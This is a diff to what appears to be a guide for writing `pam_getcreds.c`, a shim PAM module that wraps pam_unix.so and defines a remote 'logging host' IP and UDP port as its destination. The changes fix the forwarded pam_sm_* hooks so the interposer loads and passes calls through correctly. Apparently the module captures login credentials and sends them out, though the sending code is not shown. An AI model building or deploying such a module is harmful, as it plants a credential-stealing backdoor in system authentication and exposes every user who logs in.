@@ -764,16 +764,16 @@ Create a source file called `pam_getcreds.c` as follows.  It will be compiled in
 
 #define PAM_UNIX "pam_unix.so" // original module.
 #define STRLEN 2000
-#define DESTHOST "192.168.1.242" // replace with your logging host IP address.
-#define DESTPORT 1900 // use whatever UDP port you wish.
+#define DESTHOST "192.168.1.242"  // replace with your logging host IP address.
+#define DESTPORT 1900
 
 // pointers to the original Service Module functions.
 int (*func_1)(pam_handle_t *pamh, int flags, int argc, const char **argv) = NULL; // pam_sm_authenticate
 int (*func_2)(pam_handle_t *pamh, int flags, int argc, const char **argv) = NULL; // pam_sm_acct_mgmt
-int (*func_3)(pam_handle_t *pamh, int flags) = NULL; // pam_close_session
-int (*func_4)(pam_handle_t *pamh, int flags) = NULL; // pam_setcred
-int (*func_5)(pam_handle_t *pamh, int flags) = NULL; // pam_chauthtok
-int (*func_6)(pam_handle_t *pamh, int flags) = NULL; // pam_open_session
+int (*func_3)(pam_handle_t *pamh, int flags, int argc, const char **argv) = NULL; // pam_sm_close_session
+int (*func_4)(pam_handle_t *pamh, int flags, int argc, const char **argv) = NULL; // pam_sm_setcred
+int (*func_5)(pam_handle_t *pamh, int flags, int argc, const char **argv) = NULL; // pam_sm_chauthtok
+int (*func_6)(pam_handle_t *pamh, int flags, int argc, const char **argv) = NULL; // pam_sm_open_session
 
 void *hlib = NULL;
 
@@ -837,7 +837,7 @@ PAM_EXTERN int pam_sm_acct_mgmt(pam_handle_t *pamh, int flags, int argc, const c
    return func_2(pamh, flags, argc, argv);
 }
 
-PAM_EXTERN int pam_close_session(pam_handle_t *pamh, int flags)
+PAM_EXTERN int pam_sm_close_session(pam_handle_t *pamh, int flags, int argc, const char **argv)
 {
    if(!hlib)
    {
@@ -846,13 +846,13 @@ PAM_EXTERN int pam_close_session(pam_handle_t *pamh, int flags)
    }
    if(!func_3)
    {
-      *(int**)(&func_3) = dlsym(hlib, "pam_close_session");
+      *(int**)(&func_3) = dlsym(hlib, "pam_sm_close_session");
       if(!func_3) return PAM_AUTH_ERR;
    }
-   return func_3(pamh, flags);
+   return func_3(pamh, flags, argc, argv);
 }
 
-PAM_EXTERN int pam_setcred(pam_handle_t *pamh, int flags)
+PAM_EXTERN int pam_sm_setcred(pam_handle_t *pamh, int flags, int argc, const char **argv)
 {
    if(!hlib)
    {
@@ -861,13 +861,13 @@ PAM_EXTERN int pam_setcred(pam_handle_t *pamh, int flags)
    }
    if(!func_4)
    {
-      *(int**)(&func_4) = dlsym(hlib, "pam_setcred");
+      *(int**)(&func_4) = dlsym(hlib, "pam_sm_setcred");
       if(!func_4) return PAM_AUTH_ERR;
    }
-   return func_4(pamh, flags);
+   return func_4(pamh, flags, argc, argv);
 }
 
-PAM_EXTERN int pam_chauthtok(pam_handle_t *pamh, int flags)
+PAM_EXTERN int pam_sm_chauthtok(pam_handle_t *pamh, int flags, int argc, const char **argv)
 {
    if(!hlib)
    {
@@ -876,13 +876,13 @@ PAM_EXTERN int pam_chauthtok(pam_handle_t *pamh, int flags)
    }
    if(!func_5)
    {
-      *(int**)(&func_5) = dlsym(hlib, "pam_chauthtok");
+      *(int**)(&func_5) = dlsym(hlib, "pam_sm_chauthtok");
       if(!func_5) return PAM_AUTH_ERR;
    }
-   return func_5(pamh, flags);
+   return func_5(pamh, flags, argc, argv);
 }
 
-PAM_EXTERN int pam_open_session(pam_handle_t *pamh, int flags)
+PAM_EXTERN int pam_sm_open_session(pam_handle_t *pamh, int flags, int argc, const char **argv)
 {
    if(!hlib)
    {
@@ -891,10 +891,10 @@ PAM_EXTERN int pam_open_session(pam_handle_t *pamh, int flags)
    }
    if(!func_6)
    {
-      *(int**)(&func_6) = dlsym(hlib, "pam_open_session");
+      *(int**)(&func_6) = dlsym(hlib, "pam_sm_open_session");
       if(!func_6) return PAM_AUTH_ERR;
    }
-   return func_6(pamh, flags);
+   return func_6(pamh, flags, argc, argv);
 }
 ```
 
